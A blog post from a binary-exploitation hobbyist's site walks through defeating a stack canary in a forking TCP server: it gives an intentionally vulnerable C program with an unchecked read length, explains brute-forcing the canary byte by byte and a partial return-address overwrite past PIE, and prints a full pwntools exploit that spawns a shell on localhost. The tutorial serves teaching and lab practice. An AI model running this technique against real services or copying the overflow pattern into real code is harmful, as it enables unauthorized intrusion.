<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Bypass Canary in a Network Forking Service" /><meta property="og:locale" content="en" /><meta name="description" content="How to Bypass Stack Canary in a Network Forking Service" /><meta property="og:description" content="How to Bypass Stack Canary in a Network Forking Service" /><link rel="canonical" href="/posts/fork-leak-canary/" /><meta property="og:url" content="/posts/fork-leak-canary/" /><meta property="og:site_name" content="EsharkyTheGreat’s Personal Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-19T10:05:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Bypass Canary in a Network Forking Service" /><meta name="twitter:site" content="@eshwars1210" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2022-01-19T10:38:17+05:30","datePublished":"2022-01-19T10:05:00+05:30","description":"How to Bypass Stack Canary in a Network Forking Service","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/fork-leak-canary/"},"url":"/posts/fork-leak-canary/","@type":"BlogPosting","headline":"Bypass Canary in a Network Forking Service","@context":"https://schema.org"}</script><title>Bypass Canary in a Network Forking Service | EsharkyTheGreat's Personal Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="EsharkyTheGreat's Personal Blog"><meta name="application-name" content="EsharkyTheGreat's Personal Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/uchihaSasuke.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">EsharkyTheGreat's Personal Blog</a></div><div class="site-subtitle font-italic">Cyber Sec Enthusiast | Binary Exploitation | IIT(BHU)'24 | CTF w/ IIT(BHU)CyberSec'</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/EsharkyTheGreat" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/eshwars1210" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['eshwars1210','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Bypass Canary in a Network Forking Service</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Bypass Canary in a Network Forking Service</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> EsharkyTheGreat </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 19, 2022, 10:05 AM +0530" >Jan 19<i class="unloaded">2022-01-19T10:05:00+05:30</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 19, 2022, 10:38 AM +0530" >Jan 19<i class="unloaded">2022-01-19T10:38:17+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1219 words">6 min read</span></div></div><div class="post-content"><h2 id="how-to-bypass-stack-canary-in-a-network-forking-service">How to Bypass Stack Canary in a Network Forking Service</h2><h3 id="what-is-a-stack-canary-">What is a Stack Canary ?</h3><ul><li>Stack Canary is a mitigation introduced to prevent buffer overflows. It is a random value placed on the stack which changes each time the program is executed.<li>It is <strong>usually</strong> placed right before the base pointer and just before the function exits the value of the canary is checked. If the value of the canary is altered, the program exits else the function cleanly returns.</ul><h3 id="stucture-of-a-stack-canary">Stucture of a Stack Canary</h3><ul><li>Stack Canary is made up of 8 bytes where in the 1st byte is a null byte and the rest of them are random bytes i.e anything from <code class="language-plaintext highlighter-rouge">0x0 to 0xff</code><li>The reason the first byte is a null byte is because some functions like puts() keep on outputting data on the stack until they hit a null byte so since the first byte is a null byte function like puts cant leak the canary accidently</ul><h3 id="target-program">Target Program</h3><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
</span>
<span class="cp">#define PORT 4444
</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">challenge</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Please enter then length of your name: "</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Please enter your name: "</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>

    <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serverAddr</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">newSocket</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">newAddr</span><span class="p">;</span>

    <span class="n">socklen_t</span> <span class="n">addr_size</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="n">pid_t</span> <span class="n">childpid</span><span class="p">;</span>

    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sockfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Error in connection.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Server Socket is created.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serverAddr</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serverAddr</span><span class="p">));</span>
    <span class="n">serverAddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">serverAddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
    <span class="n">serverAddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serverAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serverAddr</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Error in binding.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Bind to port %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Listening....</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Error in binding.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">newSocket</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">newAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr_size</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">newSocket</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Connection accepted from %s:%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">inet_ntoa</span><span class="p">(</span><span class="n">newAddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">newAddr</span><span class="p">.</span><span class="n">sin_port</span><span class="p">));</span>

        <span class="k">if</span> <span class="p">((</span><span class="n">childpid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">newSocket</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">newSocket</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">newSocket</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">challenge</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><blockquote><p>complied with <code class="language-plaintext highlighter-rouge">gcc server.c -o server </code>. So, mitigations like PIE,ASLR are present and the stack is not executable which means ret2shellcode is not possible.</p></blockquote><h3 id="understanding-the-code">Understanding the code</h3><p>From the code we can see that the program is a network service which forks itself on each connection and then executes the challenge function. The challenge function itself has a buffer overflow vulnerability which we will abuse.</p><h3 id="reversing-the-program">Reversing the program</h3><p>Open the program in your favourite disassembler and look at the challenge function.</p><p><img data-proofer-ignore data-src="https://res.cloudinary.com/dkojbf7tx/image/upload/v1634745542/BlogImages/j9xbzgk1wqoathv3pat9.png" alt="rev_IDA" /></p><p>we see that we can read an arbitrary amount of bytes based upon our input into the buffer stored at <code class="language-plaintext highlighter-rouge">rbp - 0x50</code>. The stack canary is usually located at <code class="language-plaintext highlighter-rouge">rbp-0x8</code>. Therefore we would have to overwrite 72 bytes to reach the canary and further 8 bytes to overwrite it and then 8 bytes again to overwrite the base pointer and the 8 bytes again to overwrite the return address.</p><h3 id="exploitation">Exploitation</h3><p>The great thing about fork() is that the memory layout doesn’t change which also means that in such a forking service the canary will always remains fixed once the program starts executing. So our first step would be to brute force the canary.</p><ol><li>Fill the stack with garbage upto the stack canary<li>Overwrite the next byte with a non null byte and see that the program terminates with the message <code class="language-plaintext highlighter-rouge">***stack smashing detected***</code><li>Instead of a non null byte input a null byte and see that the program doesnt crash anymore.<li>It does’nt crash because the first byte of the canary is always a null byte and since we overwrote it with a null byte the canary itself did’nt get changed and the program did not crash.<li>Similarly brute force the entrire canary by sending bytes with values ranging from <code class="language-plaintext highlighter-rouge">0x00 to 0xff</code> until the program does’nt crash.<li>The bytes which were responsible for not crashing the program together combined are the canary.</ol><p><img data-proofer-ignore data-src="https://res.cloudinary.com/dkojbf7tx/image/upload/v1635943454/BlogImages/diozbtn6dk1hgyypxu6v.png" alt="canary.py" /></p><p>Our next step will be to overwrite the return address to point to the win function</p><ol><li>We first overwrite the base pointer with some garbage.<li>We know that the function will return back to main.<li>So the return address can be expressed as PIE base + some offset in the code section<li>Since our win function also lies in the code function we know its offset as well<li>Since memory pages are aligned to 0x1000 bytes we therfore know the last 3 nibbles of the win function correctly (you can get this offset from objdump or some decomplier as well)<li>However while sending input we cant sent nibble so we have to send 2 bytes and brute force the missing nibble<li>Bruteforcing will be easy as there are only 16 values that a nibble can take.<li>We check that if we have spawned a shell be simply sending a echo command and checking its output.</ol><p><img data-proofer-ignore data-src="https://res.cloudinary.com/dkojbf7tx/image/upload/v1635944076/BlogImages/nim0eg1ltjhckevx77wb.png" alt="brute_rip.py" /></p><h3 id="full-exploit-code">Full Exploit Code</h3><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">pwn</span>  <span class="c1"># import pwntools
</span><span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'CRITICAL'</span>
<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>


<span class="k">def</span> <span class="nf">leak_canary</span><span class="p">(</span><span class="n">canary</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>  <span class="c1"># loop 8 times for 8 bytes of a canary
</span>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>  <span class="c1"># loop 256 times for all possible values of a byte
</span>            <span class="c1"># create a connection to localhost:4444
</span>            <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
            <span class="c1"># buf is at rbp-0x50 and canary is at rbp-0x8
</span>            <span class="c1"># so we write 72 bytes of garbage + 8 byte canary
</span>            <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"80"</span>
            <span class="c1"># send size
</span>            <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="c1"># send payload
</span>            <span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span>
            <span class="n">payload2</span> <span class="o">+=</span> <span class="n">canary</span>
            <span class="n">payload2</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
            <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
            <span class="c1"># check if canary corrupted
</span>            <span class="k">if</span> <span class="sa">b</span><span class="s">"stack"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
                <span class="c1"># Append byte found to canary
</span>                <span class="n">canary</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Canary - </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="s">'all'</span><span class="p">))</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">break</span>
            <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">canary</span>


<span class="n">canary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u64</span><span class="p">(</span><span class="n">leak_canary</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[!] Canary Leaked - "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
<span class="n">rbp</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">brute_win_func</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="n">canary</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Trying </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"90"</span>
        <span class="c1"># send size
</span>        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="c1"># 00000000000013c9 &lt;win&gt;:
</span>        <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xc9</span><span class="p">)</span>  <span class="c1"># the fixed byte
</span>        <span class="c1"># the byte whose nibble we have to bruteforce
</span>        <span class="n">ret_addr</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="o">+</span><span class="mh">0x3</span><span class="p">)</span>
        <span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span>
        <span class="n">payload2</span> <span class="o">+=</span> <span class="n">canary</span>
        <span class="n">payload2</span> <span class="o">+=</span> <span class="n">rbp</span>
        <span class="n">payload2</span> <span class="o">+=</span> <span class="n">ret_addr</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
        <span class="c1"># echo command to check if we have shell
</span>        <span class="n">command</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"echo hello</span><span class="se">\n</span><span class="s">"</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">"hello"</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="c1"># drop into interactive shell session
</span>            <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>


<span class="n">brute_win_func</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
</pre></table></code></div></div><h3 id="exploit-in-action--">Exploit in Action -</h3><p><img data-proofer-ignore data-src="https://res.cloudinary.com/dkojbf7tx/image/upload/v1635944989/BlogImages/exikme8h7gvfulxbd8sz.gif" alt="exploit_gif" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>Pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/fork/" class="post-tag no-text-decoration" >fork</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >bof</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bypass Canary in a Network Forking Service - EsharkyTheGreat's Personal Blog&url=/posts/fork-leak-canary/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bypass Canary in a Network Forking Service - EsharkyTheGreat's Personal 